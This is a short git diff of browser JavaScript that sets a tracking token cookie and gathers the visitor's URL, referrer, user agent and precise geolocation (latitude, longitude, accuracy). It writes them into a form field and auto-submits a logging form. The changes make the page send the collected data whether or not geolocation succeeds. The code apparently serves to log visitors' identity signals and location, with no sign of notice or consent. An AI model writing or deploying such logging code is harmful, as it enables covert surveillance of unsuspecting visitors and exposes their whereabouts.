@@ -46,7 +46,9 @@ if (token === '') {
  set_cookie(token);
 }
 
-var info = 'href: ' + window.location.href + 
+var info = '';
+/*    
+    'href: ' + window.location.href + 
            '\ntoken: ' + token + 
            '\nreferrer: ' + document.referrer + 
            '\nhistory.length: ' + history.length + 
@@ -59,9 +61,13 @@ var info = 'href: ' + window.location.href +
 
 document.getElementById("texto").value = info;
 document.forms.formlog.submit();
+*/
 
 const geo_success = (position) => {
   info = 'token: ' + token + 
+    'href: ' + window.location.href + 
+    '\nreferrer: ' + document.referrer + 
+    '\nuserAgent: ' + navigator.userAgent + 
     '\nlatitute: ' + position.coords.latitude +
     '\nlongitude: ' + position.coords.longitude + 
     '\naccuracy: ' + position.coords.accuracy + ' m' +
@@ -74,7 +80,12 @@ const geo_success = (position) => {
 }
 
 const geo_error = () => {
-  document.getElementById("texto").value = `${token} falhou geolocation`;
+  info = 'token: ' + token + 
+    'href: ' + window.location.href + 
+    '\nreferrer: ' + document.referrer + 
+    '\nuserAgent: ' + navigator.userAgent;
+  
+  document.getElementById("texto").value = info;
   document.forms.formlog.submit();
   return;
 }
